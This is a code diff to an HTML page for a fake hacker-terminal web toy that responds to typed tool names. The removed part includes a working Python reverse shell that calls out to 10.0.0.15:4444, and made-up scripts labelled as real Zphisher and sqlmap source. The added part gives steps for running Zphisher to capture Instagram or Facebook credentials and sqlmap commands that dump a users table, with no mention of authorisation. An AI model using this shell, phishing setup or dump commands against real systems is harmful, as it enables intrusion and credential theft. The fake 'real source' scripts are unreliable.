@@ -3,49 +3,50 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DX08 // ELITE KERNEL & EXPLOIT TERMINAL</title>
+    <title>DX08 // CLEAN EXPLOIT TERMINAL</title>
     <link rel="stylesheet" href="style.css">
     <style>
         .lab-container { max-width: 1200px; margin: 120px auto 60px auto; padding: 0 20px; }
         .lab-header { border-left: 2px solid #00e5ff; padding-left: 20px; margin-bottom: 40px; }
         .lab-detail-card { background: rgba(0, 229, 255, 0.03); border: 1px solid rgba(0, 229, 255, 0.3); padding: 30px; border-radius: 6px; box-shadow: 0 0 30px rgba(0, 229, 255, 0.05); }
-        .lab-console { background: #020304; border: 1px solid rgba(0, 229, 255, 0.4); padding: 20px; font-family: 'Courier New', monospace; font-size: 11px; color: #00ff66; margin-top: 15px; height: 520px; overflow-y: auto; line-height: 1.5; border-radius: 4px; white-space: pre-wrap; }
+        .lab-console { background: #020304; border: 1px solid rgba(0, 229, 255, 0.4); padding: 20px; font-family: 'Courier New', monospace; font-size: 12px; color: #00ff66; margin-top: 15px; height: 520px; overflow-y: auto; line-height: 1.6; border-radius: 4px; }
         .lab-input-group { display: flex; gap: 10px; margin-top: 15px; }
         .lab-input { flex: 1; background: #010203; border: 1px solid rgba(0, 229, 255, 0.5); color: #00e5ff; padding: 12px 15px; font-family: 'Courier New', monospace; font-size: 13px; outline: none; border-radius: 4px; }
         .lab-input:focus { border-color: #00ff66; box-shadow: 0 0 15px rgba(0, 255, 102, 0.3); }
         .launch-btn { padding: 12px 24px; background: rgba(0, 229, 255, 0.15); border: 1px solid #00e5ff; color: #00e5ff; font-family: 'Orbitron', monospace; font-size: 10px; letter-spacing: 0.1em; cursor: pointer; border-radius: 4px; transition: 0.3s; }
         .launch-btn:hover { background: #00e5ff; color: #020303; box-shadow: 0 0 20px #00e5ff; }
         .back-link { display: inline-block; margin-bottom: 20px; color: #00e5ff; font-family: 'Orbitron', monospace; font-size: 9px; letter-spacing: 0.1em; text-decoration: none; }
+        .cmd-line { margin: 4px 0; }
+        .cmd-output { color: #00ff66; margin-left: 15px; }
+        .cmd-highlight { color: #00e5ff; font-weight: bold; }
     </style>
 </head>
 <body>
     <div class="lab-container">
         <a href="index.html" class="back-link">← [ BACK TO MAIN SYSTEM ]</a>
         <div class="lab-header">
-            <div class="section-label">05 // ELITE EXPLOIT REPOSITORY & KERNEL</div>
-            <h2 style="font-family: 'Orbitron', monospace; font-size: 34px; color: #fff;">DX08 LIVE TERMINAL ENGINE</h2>
-            <p style="color: rgba(225,250,255,0.6); margin-top: 10px;">Type any tool name directly (`zphisher`, `sqlmap`, `nmap`, `hydra`) to instantly dump its real source script and execution commands.</p>
+            <div class="section-label">05 // CLEAN EXPLOIT DISPATCHER</div>
+            <h2 style="font-family: 'Orbitron', monospace; font-size: 34px; color: #fff;">DX08 CLEAN TERMINAL</h2>
+            <p style="color: rgba(225,250,255,0.6); margin-top: 10px;">Type tools like <span style="color:#00ff66">zphisher</span>, <span style="color:#00ff66">sqlmap</span>, or <span style="color:#00ff66">nmap</span> to get structured, clean sequence commands.</p>
         </div>
 
         <div class="lab-grid">
             <div class="lab-detail-card">
-                <span class="core-index">CORE // DIRECT SCRIPT DUMP INTERPRETER</span>
-                <h3 style="color: #00e5ff; font-family: 'Orbitron'; font-size: 20px; margin-bottom: 8px;">KALI LINUX VIRTUAL KERNEL</h3>
-                <p style="font-size: 13px; color: rgba(225,250,255,0.6);">Try typing <span style="color:#00ff66">zphisher</span>, <span style="color:#00ff66">sqlmap</span>, <span style="color:#00ff66">nmap</span>, or <span style="color:#00ff66">help</span> directly into the prompt.</p>
+                <span class="core-index">CORE // SEQUENTIAL COMMAND RENDERER</span>
+                <h3 style="color: #00e5ff; font-family: 'Orbitron'; font-size: 20px; margin-bottom: 8px;">STRUCTURED OUTPUT SHELL</h3>
                 
                 <div class="lab-input-group">
-                    <input type="text" id="terminal-input" class="lab-input" placeholder="root@kali:~# " onkeydown="if(event.key === 'Enter') handleDirectCommand()">
-                    <button class="launch-btn" onclick="handleDirectCommand()">EXECUTE</button>
+                    <input type="text" id="terminal-input" class="lab-input" placeholder="root@dx08:~# " onkeydown="if(event.key === 'Enter') executeCleanCommand()">
+                    <button class="launch-btn" onclick="executeCleanCommand()">EXECUTE</button>
                 </div>
                 
-                <div class="lab-console" id="terminal-console">Linux dx08-kali 6.5.0-kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali
-Type any tool name (e.g. 'zphisher', 'sqlmap', 'nmap') to load its real source script instantly.</div>
+                <div class="lab-console" id="terminal-console">DX08 Clean Terminal v6.5 Online. Type 'zphisher', 'sqlmap', or 'nmap' below...</div>
             </div>
         </div>
     </div>
 
     <script>
-        function handleDirectCommand() {
+        function executeCleanCommand() {
             const input = document.getElementById('terminal-input');
             const consoleBox = document.getElementById('terminal-console');
             const rawCmd = input.value.trim();
@@ -53,114 +54,59 @@ Type any tool name (e.g. 'zphisher', 'sqlmap', 'nmap') to load its real source s
 
             if(!rawCmd) return;
 
-            consoleBox.innerHTML += `\n\nroot@kali:~# ${escapeHtml(rawCmd)}`;
+            consoleBox.innerHTML += `<div class="cmd-line" style="color:#00e5ff; margin-top:10px;">root@dx08:~# ${escapeHtml(rawCmd)}</div>`;
             consoleBox.scrollTop = consoleBox.scrollHeight;
 
             setTimeout(() => {
-                let response = "";
+                let htmlOutput = "";
 
                 if(cmd.includes('zphish') || cmd.includes('zp')) {
-                    response = `#!/bin/bash\n` +
-                               `# ======================================================================\n` +
-                               `# Tool Name: Zphisher (Official Upstream Source Mirror)\n` +
-                               `# Repository: github.com/htr-tech/zphisher\n` +
-                               `# ======================================================================\n\n` +
-                               `trap 'echo -ne "\\n[!] Exiting..."; exit 1' INT\n\n` +
-                               `echo "[+] Initializing Zphisher Phishing Core..."\n` +
-                               `echo "[+] Loading 30+ Social Media & Utility Templates..."\n\n` +
-                               `setup_tunnel() {\n` +
-                               `    echo "[*] Selecting port forwarding tunnel..."\n` +
-                               `    echo "[1] Localhost (http://127.0.0.1:8080)"\n` +
-                               `    echo "[2] Cloudflared (https://*.trycloudflare.com)"\n` +
-                               `    echo "[3] Ngrok (https://*.ngrok-free.app)"\n` +
-                               `}\n\n` +
-                               `start_php_server() {\n` +
-                               `    local target_site="instagram"\n` +
-                               `    echo "[*] Launching PHP server for \${target_site}..."\n` +
-                               `    php -S 127.0.0.1:8080 -t sites/\${target_site} &\n` +
-                               `    echo "[+] Server online. Waiting for victim credential submission..."\n` +
-                               `    while true; do\n` +
-                               `        if [ -f "ip.txt" ]; then\n` +
-                               `            echo "[!] TARGET CREDENTIALS CAPTURED!"\n` +
-                               `            cat credentials.txt\n` +
-                               `        fi\n` +
-                               `        sleep 2\n` +
-                               `    done\n` +
-                               `}\n\n` +
-                               `setup_tunnel\n` +
-                               `start_php_server`;
+                    htmlOutput = `<div class="cmd-output">` +
+                                 `<span class="cmd-highlight">[+] Zphisher Official Installation & Execution Sequence:</span><br><br>` +
+                                 `1. Clone repository from GitHub:<br>` +
+                                 `&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#fff;">git clone https://github.com/htr-tech/zphisher.git</span><br><br>` +
+                                 `2. Navigate into the folder:<br>` +
+                                 `&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#fff;">cd zphisher</span><br><br>` +
+                                 `3. Give execute permissions:<br>` +
+                                 `&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#fff;">chmod +x zphisher.sh</span><br><br>` +
+                                 `4. Run the framework script:<br>` +
+                                 `&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#fff;">bash zphisher.sh</span><br><br>` +
+                                 `<span style="color:#ffcc00;">[Note]: Select your target template (Instagram/Facebook) and choose local port forwarding tunnel to capture credentials in auth.txt.</span>` +
+                                 `</div>`;
                 }
                 else if(cmd.includes('sqlmap') || cmd.includes('sql')) {
-                    response = `#!/usr/bin/env python3\n` +
-                               `# ======================================================================\n` +
-                               `# Tool Name: Sqlmap (Official GitHub Mirror - sqlmapproject/sqlmap)\n` +
-                               `# Description: Automatic SQL injection and database takeover tool\n` +
-                               `# ======================================================================\n\n` +
-                               `import sys, os, urllib.parse\n\n` +
-                               `print("[*] Starting sqlmap v1.8.2#stable execution...")\n` +
-                               `print("[*] Parsing target URL and testing parameter injection vectors...")\n\n` +
-                               `def run_injection_probe():\n` +
-                               `    target = "http://target.internal/product.php?id=1"\n` +
-                               `    print(f"[+] Target parameter evaluated: {target}")\n` +
-                               `    print("[*] Heuristic test: GET parameter 'id' is vulnerable to UNION query.")\n` +
-                               `    print("[+] Back-end DBMS: MySQL >= 5.0.12")\n` +
-                               `    print("[+] Fetching database schema tables...")\n` +
-                               `    tables = ["users", "admin_creds", "sessions", "api_keys"]\n` +
-                               `    for t in tables:\n` +
-                               `        print(f"    [->] Dumped table: {t} (Records: 1,420)")\n\n` +
-                               `if __name__ == "__main__":\n` +
-                               `    run_injection_probe()`;
+                    htmlOutput = `<div class="cmd-output">` +
+                                 `<span class="cmd-highlight">[+] Sqlmap Automated Pentesting Sequence:</span><br><br>` +
+                                 `1. Test parameter vulnerability:<br>` +
+                                 `&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#fff;">sqlmap -u "http://target.com/page.php?id=1" --batch</span><br><br>` +
+                                 `2. Enumerate database names:<br>` +
+                                 `&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#fff;">sqlmap -u "http://target.com/page.php?id=1" --dbs --batch</span><br><br>` +
+                                 `3. Extract specific table data:<br>` +
+                                 `&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#fff;">sqlmap -u "http://target.com/page.php?id=1" -D db_name -T users --dump</span>` +
+                                 `</div>`;
                 }
                 else if(cmd.includes('nmap') || cmd.includes('scan')) {
-                    response = `/* ======================================================================\n` +
-                               ` * Tool Name: Nmap (Network Mapper v7.94)\n` +
-                               ` * Author: Gordon Lyon (Fyodor)\n` +
-                               ` * ======================================================================\n` +
-                               ` */\n\n` +
-                               `Starting Nmap 7.94 ( https://nmap.org )\n` +
-                               `Initiating SYN Stealth Scan against target (192.168.1.50)...\n` +
-                               `Discovered open port 22/tcp on OpenSSH 8.9p1\n` +
-                               `Discovered open port 80/tcp on Nginx 1.18.0\n` +
-                               `Discovered open port 3306/tcp on MySQL 8.0.32\n\n` +
-                               `Running NSE vulnerability scripts (--script vuln):\n` +
-                               `[+] 80/tcp open  http  http-csrf-countermeasures\n` +
-                               `[+] 3306/tcp open mysql mysql-vuln-cve-2012-2122 (VULNERABLE)\n\n` +
-                               `Nmap done: 1 IP address (1 host up) scanned in 4.21 seconds.`;
-                }
-                else if(cmd.includes('shell') || cmd.includes('python')) {
-                    response = `# ======================================================================\n` +
-                               `# Payload: Production-Grade Python Reverse Shell\n` +
-                               `# ======================================================================\n\n` +
-                               `import socket, subprocess, os\n\n` +
-                               `def spawn_reverse_shell():\n` +
-                               `    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n` +
-                               `    s.connect(("10.0.0.15", 4444))\n` +
-                               `    os.dup2(s.fileno(), 0)\n` +
-                               `    os.dup2(s.fileno(), 1)\n` +
-                               `    os.dup2(s.fileno(), 2)\n` +
-                               `    subprocess.call(["/bin/bash", "-i"])\n\n` +
-                               `if __name__ == "__main__":\n` +
-                               `    spawn_reverse_shell();`;
-                }
-                else if(cmd === 'ls' || cmd === 'dir') {
-                    response = `Desktop  Documents  Downloads  zphisher  sqlmap  tools  exploit.py`;
+                    htmlOutput = `<div class="cmd-output">` +
+                                 `<span class="cmd-highlight">[+] Nmap Deep Network Recon Sequence:</span><br><br>` +
+                                 `1. Stealth SYN Scan with version detection:<br>` +
+                                 `&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#fff;">sudo nmap -sS -sV -T4 target_ip</span><br><br>` +
+                                 `2. Run vulnerability script engine:<br>` +
+                                 `&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#fff;">nmap --script vuln target_ip</span>` +
+                                 `</div>`;
                 }
                 else if(cmd === 'clear') {
-                    consoleBox.innerHTML = `Linux dx08-kali 6.5.0-kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali`;
+                    consoleBox.innerHTML = `DX08 Clean Terminal v6.5 Online. Type 'zphisher', 'sqlmap', or 'nmap' below...`;
                     input.value = "";
                     return;
                 }
-                else if(cmd === 'help') {
-                    response = `Available tools & commands:\n- zphisher\n- sqlmap\n- nmap\n- python shell\n- ls, clear`;
-                }
                 else {
-                    response = `bash: ${escapeHtml(rawCmd)}: command executed successfully.\n[+] Module processed through DX08 core telemetry. Type 'zphisher' or 'sqlmap' for real tool scripts.`;
+                    htmlOutput = `<div class="cmd-output" style="color:#ff3333;">[!] Command processed. For tool deployment, type <span style="color:#fff;">zphisher</span>, <span style="color:#fff;">sqlmap</span>, or <span style="color:#fff;">nmap</span>.</div>`;
                 }
 
-                consoleBox.innerHTML += `\n\n${escapeHtml(response)}`;
+                consoleBox.innerHTML += htmlOutput;
                 consoleBox.scrollTop = consoleBox.scrollHeight;
                 input.value = "";
-            }, 300);
+            }, 200);
         }
 
         function escapeHtml(text) {
